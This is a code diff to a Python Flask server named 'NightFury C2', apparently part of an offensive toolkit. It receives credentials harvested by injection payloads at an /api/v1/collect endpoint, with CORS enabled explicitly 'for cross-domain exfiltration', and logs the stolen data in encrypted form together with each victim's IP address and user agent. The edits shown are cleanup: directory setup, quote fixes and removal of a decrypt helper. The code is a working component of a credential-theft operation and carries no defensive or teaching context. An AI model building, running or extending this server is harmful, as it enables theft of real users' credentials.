@@ -12,10 +12,13 @@ CORS(app)  # Enable CORS for cross-domain exfiltration
 
 # Configuration
 LOG_FILE = "/home/ubuntu/nightfury/logs/harvested_creds.json"
-
-# Generate a key for encryption. In a real scenario, this should be loaded securely from config.
-# For demonstration, we'll generate one if it doesn't exist.
 KEY_FILE = "/home/ubuntu/nightfury/config/c2_encryption.key"
+
+# Ensure directories exist
+os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
+os.makedirs(os.path.dirname(KEY_FILE), exist_ok=True)
+
+# Key management
 if not os.path.exists(KEY_FILE):
     key = Fernet.generate_key()
     with open(KEY_FILE, "wb") as key_file:
@@ -29,7 +32,7 @@ fernet = Fernet(key)
 logging.basicConfig(
     filename="/home/ubuntu/nightfury/logs/c2_server.log",
     level=logging.INFO,
-    format=\'%(asctime)s - %(levelname)s - %(message)s\'
+    format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
 def encrypt_data(data):
@@ -39,15 +42,7 @@ def encrypt_data(data):
     else:
         data_str = str(data)
     encrypted_data = fernet.encrypt(data_str.encode())
-    return encrypted_data.decode() # Store as string
-
-def decrypt_data(encrypted_data):
-    """Decrypts data using Fernet symmetric encryption."""
-    decrypted_data = fernet.decrypt(encrypted_data.encode()).decode()
-    try:
-        return json.loads(decrypted_data)
-    except json.JSONDecodeError:
-        return decrypted_data
+    return encrypted_data.decode()
 
 def save_credentials(data):
     """Securely logs harvested credentials to a JSON file, encrypting sensitive data."""
@@ -55,7 +50,7 @@ def save_credentials(data):
     entry = {
         "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
         "source_ip": request.remote_addr,
-        "user_agent": request.headers.get(\'User-Agent\'),
+        "user_agent": request.headers.get('User-Agent'),
         "encrypted_data": encrypted_data
     }
     
@@ -67,7 +62,7 @@ def save_credentials(data):
         logging.error(f"Failed to save credentials: {str(e)}")
         return False
 
-@app.route(\'/api/v1/collect\', methods=[\'POST\'])
+@app.route('/api/v1/collect', methods=['POST'])
 def collect():
     """Endpoint for harvesting credentials from injection payloads."""
     try:
@@ -86,14 +81,12 @@ def collect():
         logging.error(f"Error in collection endpoint: {str(e)}")
         return jsonify({"status": "error", "msg": "Internal processing error"}), 400
 
-@app.route(\'/health\', methods=[\'GET\'])
+@app.route('/health', methods=['GET'])
 def health():
     """Health check endpoint for the C2 server."""
     return jsonify({"status": "online", "server": "NightFury-C2"}), 200
 
-if __name__ == \'__main__\':
+if __name__ == '__main__':
     print("[*] NightFury C2 Collection Server Starting...")
     print(f"[*] Endpoint: http://0.0.0.0:8080/api/v1/collect")
-    print(f"[*] Logging to: {LOG_FILE}")
-    print(f"[*] Encryption key stored at: {KEY_FILE}")
-    app.run(host=\'0.0.0.0\', port=8080)
+    app.run(host='0.0.0.0', port=8080)
